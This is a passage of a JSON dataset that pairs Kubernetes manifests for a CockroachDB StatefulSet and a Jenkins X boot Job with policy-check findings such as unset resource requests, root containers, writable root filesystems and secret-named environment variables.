    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"bootstrap\" has cpu request 0"
  },
  {
    "id": "2502",
    "manifest_path": "data/manifests/the_stack_sample/sample_0663.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app: cockroachdb\n  name: cockroachdb\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: cockroachdb\n  template:\n    metadata:\n      labels:\n        app: cockroachdb\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - cockroachdb\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      containers:\n      - command:\n        - /bin/bash\n        - -ecx\n        - \"# The use of qualified `hostname -f` is crucial:\\n# Other nodes aren't\\\n          \\ able to look up the unqualified hostname.\\nCRARGS=(\\\"start\\\" \\\"--logtostderr\\\"\\\n          \\ \\\"--insecure\\\" \\\"--host\\\" \\\"$(hostname -f)\\\" \\\"--http-host\\\" \\\"0.0.0.0\\\"\\\n          )\\n# We only want to initialize a new cluster (by omitting the join flag)\\n\\\n          # if we're sure that we're the first node (i.e. index 0) and that\\n# there\\\n          \\ aren't any other nodes running as part of the cluster that\\n# this is\\\n          \\ supposed to be a part of (which indicates that a cluster\\n# already exists\\\n          \\ and we should make sure not to create a new one).\\n# It's fine to run\\\n          \\ without --join on a restart if there aren't any\\n# other nodes.\\nif [\\\n          \\ ! \\\"$(hostname)\\\" == \\\"cockroachdb-0\\\" ] || \\\\\\n   [ -e \\\"/cockroach/cockroach-data/cluster_exists_marker\\\"\\\n          \\ ]\\nthen\\n  # We don't join cockroachdb in order to avoid a node attempting\\n\\\n          \\  # to join itself, which currently doesn't work\\n  # (https://github.com/cockroachdb/cockroach/issues/9625).\\n\\\n          \\  CRARGS+=(\\\"--join\\\" \\\"cockroachdb-public\\\")\\nfi\\nexec /cockroach/cockroach\\\n          \\ ${CRARGS[*]}\\n\"\n        image: cockroachdb/cockroach:v1.1.0\n        imagePullPolicy: IfNotPresent\n        name: cockroachdb\n        ports:\n        - containerPort: 26257\n          name: grpc\n        - containerPort: 8080\n          name: http\n        volumeMounts:\n        - mountPath: /cockroach/cockroach-data\n          name: datadir\n      initContainers:\n      - args:\n        - -on-start=/on-start.sh\n        - -service=cockroachdb\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: cockroachdb/cockroach-k8s-init:0.2\n        imagePullPolicy: IfNotPresent\n        name: bootstrap\n        volumeMounts:\n        - mountPath: /cockroach/cockroach-data\n          name: datadir\n      volumes:\n      - name: datadir\n        persistentVolumeClaim:\n          claimName: datadir\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cockroachdb\" has cpu request 0"
  },
  {
    "id": "2503",
    "manifest_path": "data/manifests/the_stack_sample/sample_0663.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app: cockroachdb\n  name: cockroachdb\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: cockroachdb\n  template:\n    metadata:\n      labels:\n        app: cockroachdb\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - cockroachdb\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      containers:\n      - command:\n        - /bin/bash\n        - -ecx\n        - \"# The use of qualified `hostname -f` is crucial:\\n# Other nodes aren't\\\n          \\ able to look up the unqualified hostname.\\nCRARGS=(\\\"start\\\" \\\"--logtostderr\\\"\\\n          \\ \\\"--insecure\\\" \\\"--host\\\" \\\"$(hostname -f)\\\" \\\"--http-host\\\" \\\"0.0.0.0\\\"\\\n          )\\n# We only want to initialize a new cluster (by omitting the join flag)\\n\\\n          # if we're sure that we're the first node (i.e. index 0) and that\\n# there\\\n          \\ aren't any other nodes running as part of the cluster that\\n# this is\\\n          \\ supposed to be a part of (which indicates that a cluster\\n# already exists\\\n          \\ and we should make sure not to create a new one).\\n# It's fine to run\\\n          \\ without --join on a restart if there aren't any\\n# other nodes.\\nif [\\\n          \\ ! \\\"$(hostname)\\\" == \\\"cockroachdb-0\\\" ] || \\\\\\n   [ -e \\\"/cockroach/cockroach-data/cluster_exists_marker\\\"\\\n          \\ ]\\nthen\\n  # We don't join cockroachdb in order to avoid a node attempting\\n\\\n          \\  # to join itself, which currently doesn't work\\n  # (https://github.com/cockroachdb/cockroach/issues/9625).\\n\\\n          \\  CRARGS+=(\\\"--join\\\" \\\"cockroachdb-public\\\")\\nfi\\nexec /cockroach/cockroach\\\n          \\ ${CRARGS[*]}\\n\"\n        image: cockroachdb/cockroach:v1.1.0\n        imagePullPolicy: IfNotPresent\n        name: cockroachdb\n        ports:\n        - containerPort: 26257\n          name: grpc\n        - containerPort: 8080\n          name: http\n        volumeMounts:\n        - mountPath: /cockroach/cockroach-data\n          name: datadir\n      initContainers:\n      - args:\n        - -on-start=/on-start.sh\n        - -service=cockroachdb\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: cockroachdb/cockroach-k8s-init:0.2\n        imagePullPolicy: IfNotPresent\n        name: bootstrap\n        volumeMounts:\n        - mountPath: /cockroach/cockroach-data\n          name: datadir\n      volumes:\n      - name: datadir\n        persistentVolumeClaim:\n          claimName: datadir\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"bootstrap\" has memory limit 0"
  },
  {
    "id": "2504",
    "manifest_path": "data/manifests/the_stack_sample/sample_0663.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app: cockroachdb\n  name: cockroachdb\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: cockroachdb\n  template:\n    metadata:\n      labels:\n        app: cockroachdb\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - cockroachdb\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      containers:\n      - command:\n        - /bin/bash\n        - -ecx\n        - \"# The use of qualified `hostname -f` is crucial:\\n# Other nodes aren't\\\n          \\ able to look up the unqualified hostname.\\nCRARGS=(\\\"start\\\" \\\"--logtostderr\\\"\\\n          \\ \\\"--insecure\\\" \\\"--host\\\" \\\"$(hostname -f)\\\" \\\"--http-host\\\" \\\"0.0.0.0\\\"\\\n          )\\n# We only want to initialize a new cluster (by omitting the join flag)\\n\\\n          # if we're sure that we're the first node (i.e. index 0) and that\\n# there\\\n          \\ aren't any other nodes running as part of the cluster that\\n# this is\\\n          \\ supposed to be a part of (which indicates that a cluster\\n# already exists\\\n          \\ and we should make sure not to create a new one).\\n# It's fine to run\\\n          \\ without --join on a restart if there aren't any\\n# other nodes.\\nif [\\\n          \\ ! \\\"$(hostname)\\\" == \\\"cockroachdb-0\\\" ] || \\\\\\n   [ -e \\\"/cockroach/cockroach-data/cluster_exists_marker\\\"\\\n          \\ ]\\nthen\\n  # We don't join cockroachdb in order to avoid a node attempting\\n\\\n          \\  # to join itself, which currently doesn't work\\n  # (https://github.com/cockroachdb/cockroach/issues/9625).\\n\\\n          \\  CRARGS+=(\\\"--join\\\" \\\"cockroachdb-public\\\")\\nfi\\nexec /cockroach/cockroach\\\n          \\ ${CRARGS[*]}\\n\"\n        image: cockroachdb/cockroach:v1.1.0\n        imagePullPolicy: IfNotPresent\n        name: cockroachdb\n        ports:\n        - containerPort: 26257\n          name: grpc\n        - containerPort: 8080\n          name: http\n        volumeMounts:\n        - mountPath: /cockroach/cockroach-data\n          name: datadir\n      initContainers:\n      - args:\n        - -on-start=/on-start.sh\n        - -service=cockroachdb\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: cockroachdb/cockroach-k8s-init:0.2\n        imagePullPolicy: IfNotPresent\n        name: bootstrap\n        volumeMounts:\n        - mountPath: /cockroach/cockroach-data\n          name: datadir\n      volumes:\n      - name: datadir\n        persistentVolumeClaim:\n          claimName: datadir\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cockroachdb\" has memory limit 0"
  },
  {
    "id": "2505",
    "manifest_path": "data/manifests/the_stack_sample/sample_0664.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - make apply || make failed\n        command:\n        - /bin/sh\n        - -c\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: JX_SECRET_SIDECAR\n          value: gsm\n        - name: JX_SECRET_TMP_DIR\n          value: /workspace/source/.jx-secrets\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      - command:\n        - versionStream/src/wait-for-complete.sh\n        image: google/cloud-sdk:slim\n        imagePullPolicy: Always\n        name: gsm\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable JX_SECRET_SIDECAR in container \"job\" found"
  },
  {
    "id": "2506",
    "manifest_path": "data/manifests/the_stack_sample/sample_0664.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - make apply || make failed\n        command:\n        - /bin/sh\n        - -c\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: JX_SECRET_SIDECAR\n          value: gsm\n        - name: JX_SECRET_TMP_DIR\n          value: /workspace/source/.jx-secrets\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      - command:\n        - versionStream/src/wait-for-complete.sh\n        image: google/cloud-sdk:slim\n        imagePullPolicy: Always\n        name: gsm\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable JX_SECRET_TMP_DIR in container \"job\" found"
  },
  {
    "id": "2507",
    "manifest_path": "data/manifests/the_stack_sample/sample_0664.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - make apply || make failed\n        command:\n        - /bin/sh\n        - -c\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: JX_SECRET_SIDECAR\n          value: gsm\n        - name: JX_SECRET_TMP_DIR\n          value: /workspace/source/.jx-secrets\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      - command:\n        - versionStream/src/wait-for-complete.sh\n        image: google/cloud-sdk:slim\n        imagePullPolicy: Always\n        name: gsm\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "2508",
    "manifest_path": "data/manifests/the_stack_sample/sample_0664.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - make apply || make failed\n        command:\n        - /bin/sh\n        - -c\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: JX_SECRET_SIDECAR\n          value: gsm\n        - name: JX_SECRET_TMP_DIR\n          value: /workspace/source/.jx-secrets\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      - command:\n        - versionStream/src/wait-for-complete.sh\n        image: google/cloud-sdk:slim\n        imagePullPolicy: Always\n        name: gsm\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"git-clone\" does not have a read-only root file system"
  },
  {
    "id": "2509",
    "manifest_path": "data/manifests/the_stack_sample/sample_0664.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - make apply || make failed\n        command:\n        - /bin/sh\n        - -c\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: JX_SECRET_SIDECAR\n          value: gsm\n        - name: JX_SECRET_TMP_DIR\n          value: /workspace/source/.jx-secrets\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      - command:\n        - versionStream/src/wait-for-complete.sh\n        image: google/cloud-sdk:slim\n        imagePullPolicy: Always\n        name: gsm\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"gsm\" does not have a read-only root file system"
  },
  {
    "id": "2510",
    "manifest_path": "data/manifests/the_stack_sample/sample_0664.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - make apply || make failed\n        command:\n        - /bin/sh\n        - -c\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: JX_SECRET_SIDECAR\n          value: gsm\n        - name: JX_SECRET_TMP_DIR\n          value: /workspace/source/.jx-secrets\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      - command:\n        - versionStream/src/wait-for-complete.sh\n        image: google/cloud-sdk:slim\n        imagePullPolicy: Always\n        name: gsm\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"job\" does not have a read-only root file system"
  },
  {
    "id": "2511",
    "manifest_path": "data/manifests/the_stack_sample/sample_0664.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - make apply || make failed\n        command:\n        - /bin/sh\n        - -c\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: JX_SECRET_SIDECAR\n          value: gsm\n        - name: JX_SECRET_TMP_DIR\n          value: /workspace/source/.jx-secrets\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      - command:\n        - versionStream/src/wait-for-complete.sh\n        image: google/cloud-sdk:slim\n        imagePullPolicy: Always\n        name: gsm\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"jx-boot-job\" not found"
  },
  {
    "id": "2512",
    "manifest_path": "data/manifests/the_stack_sample/sample_0664.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - make apply || make failed\n        command:\n        - /bin/sh\n        - -c\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: JX_SECRET_SIDECAR\n          value: gsm\n        - name: JX_SECRET_TMP_DIR\n          value: /workspace/source/.jx-secrets\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      - command:\n        - versionStream/src/wait-for-complete.sh\n        image: google/cloud-sdk:slim\n        imagePullPolicy: Always\n        name: gsm\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"git-clone\" is not set to runAsNonRoot"
  },
  {
    "id": "2513",
    "manifest_path": "data/manifests/the_stack_sample/sample_0664.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - make apply || make failed\n        command:\n        - /bin/sh\n        - -c\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: JX_SECRET_SIDECAR\n          value: gsm\n        - name: JX_SECRET_TMP_DIR\n          value: /workspace/source/.jx-secrets\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      - command:\n        - versionStream/src/wait-for-complete.sh\n        image: google/cloud-sdk:slim\n        imagePullPolicy: Always\n        name: gsm\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"gsm\" is not set to runAsNonRoot"
  },
  {
    "id": "2514",
    "manifest_path": "data/manifests/the_stack_sample/sample_0664.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - make apply || make failed\n        command:\n        - /bin/sh\n        - -c\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: JX_SECRET_SIDECAR\n          value: gsm\n        - name: JX_SECRET_TMP_DIR\n          value: /workspace/source/.jx-secrets\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      - command:\n        - versionStream/src/wait-for-complete.sh\n        image: google/cloud-sdk:slim\n        imagePullPolicy: Always\n        name: gsm\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"job\" is not set to runAsNonRoot"
  },
  {
    "id": "2515",
    "manifest_path": "data/manifests/the_stack_sample/sample_0664.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - make apply || make failed\n        command:\n        - /bin/sh\n        - -c\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: JX_SECRET_SIDECAR\n          value: gsm\n        - name: JX_SECRET_TMP_DIR\n          value: /workspace/source/.jx-secrets\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      - command:\n        - versionStream/src/wait-for-complete.sh\n        image: google/cloud-sdk:slim\n        imagePullPolicy: Always\n        name: gsm\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"git-clone\" has cpu request 0"
  },
  {
    "id": "2516",
    "manifest_path": "data/manifests/the_stack_sample/sample_0664.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - make apply || make failed\n        command:\n        - /bin/sh\n        - -c\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: JX_SECRET_SIDECAR\n          value: gsm\n        - name: JX_SECRET_TMP_DIR\n          value: /workspace/source/.jx-secrets\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: gcr.io/jenkinsxio/jx-boot:3.1.118\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      - command:\n        - versionStream/src/wait-for-complete.sh\n        image: google/cloud-sdk:slim\n        imagePullPolicy: Always\n        name: gsm\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"gsm\" has cpu request 0"
  },
  {
    "id": "2517",
    "manifest_path": "data/manifests/the_stack_sample/sample_0664.yaml",
